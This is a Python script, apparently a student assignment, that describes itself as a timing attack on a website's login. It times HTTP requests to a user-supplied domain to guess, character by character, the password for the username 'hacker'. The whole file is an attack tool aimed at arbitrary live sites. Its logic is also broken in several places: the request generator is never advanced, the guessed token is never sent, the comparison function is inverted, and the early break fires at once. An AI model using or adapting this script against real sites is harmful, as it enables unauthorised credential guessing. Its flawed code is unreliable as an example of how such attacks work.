"""
    program2.py <nameofthesite>
    attack the authentication to determine the username and the password using ,
    leaking for the time information.
"""

import sys
import time
import string
import requests
import threading
from timeit import default_timer as timer

"""
    the program uses instances of threads for every request,
    to the given domain
"""


class Attack(threading.Thread):
    def __init__(self):
        """
            constructor of the Attack method,
        """
        super(threading.Thread, self).__init__()
        self.charset = string.printable
        self.username = "hacker"
        self.domain = ''
        self.base_token = ''
        self.hidden_char = '*'
        self.token_length = 50
        self._token = [c for c in self.base_token] + [self.hidden_char for _ in
                                                      range(self.token_length - len(self.base_token))]

    def get_token(self):
        """
        return a token stored
        :return:
        """
        return ''.join(self._token)

    @staticmethod
    def _get_timing():
        """
        get a time based unit for a given request
        :return:
        """
        return time.time()

    @classmethod
    def _average(cls, l):

        """ Calculate the average of an uniform list
            :l: The list on which you want to calculate the average.
        """

        return sum(l) / float(len(l))

    def _get_token_offsets(self):

        """ Retrieve the token extremities from the length and the hidden char
        """

        return range(len(''.join(self._token).rstrip(self.hidden_char)), self.token_length)

    def process(self):
        """
            process request to get the best candidate and the password
        :return:
        """
        for offset in self._get_token_offsets():
            timings = []
            for i, char in enumerate(self.charset):
                self._token[offset] = char
                t1 = self._get_timing()
                self.get_request()
                t2 = self._get_timing()
                timings.append(t2 - t1)
                best_candidate = self.charset[timings.index(max(timings))]
                if max(timings) > min(timings) + 0:
                    break
            found = self.charset[timings.index(max(timings))]
            self._token[offset] = found
            print("Found Char: %d:%x:%c - Best-Candidate : %s - Avg: %s" % (
                ord(found),
                ord(found),
                found,
                max(timings),
                self._average(timings)
            ))
        print("TOKEN: %s" % self.get_token())

    @staticmethod
    def is_equal(a, b):
        """
            using string comparison to guess the right password
        :param a:
        :param b:
        :return:
        """
        if len(a) != len(b):
            return False

        result = 0
        for x, y in zip(a, b):
            result += x == y
        return result == 0

    def get_request(self):
        """
            method to return request from the given domain
            using a get request.
        :return:
        """
        payload = {
            "username": self.username,
        }
        assert isinstance(payload, dict)
        yield requests.get("http://{}".format(self.domain), payload)

    def attack_target(self):
        """
            begins attack on the target to find the password using the using username hacker
        :return:
        """
        if self.domain.find("http") < 0:
            start = timer()
            print("Predicting the password from username hacker")
            res = self.get_request().__next__()
            end = timer()
            diff = end - start
            self.process()
            if self.is_equal(self.username, res.text):
                print("Found password ... {}".format(res.text.lower()))
            # else:
            #   print("Not found ..")
            print("Total time taken {} seconds .".format(diff))

    @staticmethod
    def is_live(target):
        """
            method checks for a live domain,
            returns true if the domain is live else returns false
        :param target: return true is is alive
        :return:
        """
        assert isinstance(target, str)
        try:
            return requests.get("http://{}".format(target)).status_code == 200
        except requests.ConnectionError:
            print("Name or service not Known ..")
            print("Use www.example.com or make sure the domain is live..")
            sys.exit(0)

    def run(self, target):
        """
        main start of the program
        :param target:
        :return:
        """
        if self.is_live(target):
            self.domain = target
            print("Using time function vulnerability ...")
            self.attack_target()
        else:
            print("Domain: {} Is down .".format(target))
            sys.exit(1)


threads = []

if __name__ == '__main__':
    """
        create an instance of the attack method, 
    """
    attack = Attack()
    try:
        if len(sys.argv) > 1:
            """
                Capture the domain from the command line arguments
            """
            domain = sys.argv[1]
            th = threading.Thread(target=attack.run(domain))
            try:
                th.start()
                threads.append(th)
                for thread in threads:
                    thread.join()
            except KeyboardInterrupt:
                print("User interrupt ... ")
        else:
            print("python3 program2.py <domainname>")
    except Exception as e:
        # print out an exception to the console
        print(str(e))
